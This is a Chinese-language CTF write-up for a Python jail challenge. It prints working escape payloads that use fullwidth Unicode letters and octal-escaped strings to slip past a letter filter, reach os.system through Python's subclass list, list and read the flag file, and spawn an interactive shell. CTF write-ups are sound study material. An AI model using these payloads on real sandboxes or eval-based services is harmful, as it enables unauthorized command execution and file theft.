##### tags:`TSC_CTF_2025`

# TSC CTF MISC：calc

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

## <span class="red">**題目**</span>

- ![image](https://hackmd.io/_uploads/SypDjoVDyg.png)

&emsp;

## <span class="red">**解題過程**</span>

1. **延續 Baby Jail 的解題 payload ，一開始嘗試使用 ```(().__ｃｌａｓｓ__.__ｂａｓｅ__.__ｓｕｂｃｌａｓｓｅｓ__().ｐｏｐ(120))().ｌｏａｄ_ｍｏｄｕｌｅ('ｏｓ').ｓｙｓｔｅｍ("ｌｓ /")``` 去繞過 ascii_letters 檢查 ，但現在要解決的地方是使用 os 如果是全形 load_module 會讀不懂**

- ![image](https://hackmd.io/_uploads/SyEdzyrPJe.png)

&emsp;

2. **這時候我們就可以用神奇的 8 進制， 像是 ```(().__ｃｌａｓｓ__.__ｂａｓｅ__.__ｓｕｂｃｌａｓｓｅｓ__().ｐｏｐ(120))().ｌｏａｄ_ｍｏｄｕｌｅ("\157\163").ｓｙｓｔｅｍ("\154\163 /")``` ，這段 payload 中 ```"\157\163" = "os"``` 且 ```"\154\163 /" = "ls /"```。這行指令能先知道 / 下有哪些資訊**

- ![image](https://hackmd.io/_uploads/HksXzJBwyg.png)

&emsp;

3. **發現有個 flag 的檔案，那我就可以下 ```cat /f*``` 去找到 flag 的內容。**

- ***像是```(().__ｃｌａｓｓ__.__ｂａｓｅ__.__ｓｕｂｃｌａｓｓｅｓ__().ｐｏｐ(120))().ｌｏａｄ_ｍｏｄｕｌｅ("\157\163").ｓｙｓｔｅｍ("\143\141\164\ /\146*")```**

- ![image](https://hackmd.io/_uploads/HyjVMJSv1e.png)

&emsp;

## <span class="red">**額外收穫**</span>

1. **改動 payload 變為 ```().__ｃｌａｓｓ__.__ｂａｓｅ__.__ｓｕｂｃｌａｓｓｅｓ__().ｐｏｐ(155).__ｉｎｉｔ__.__ｇｌｏｂａｌｓ__.ｇｅｔ("\163\171\163\164\145\155")("\163\150")``` ，其中 ```"\163\171\163\164\145\155" = "system"``` 且 ```"\163\150" = "sh"``` ，這樣的好處是可以直接控制 shell ，也就是之後的指令可以直接下不需要每次都做 Bypass**
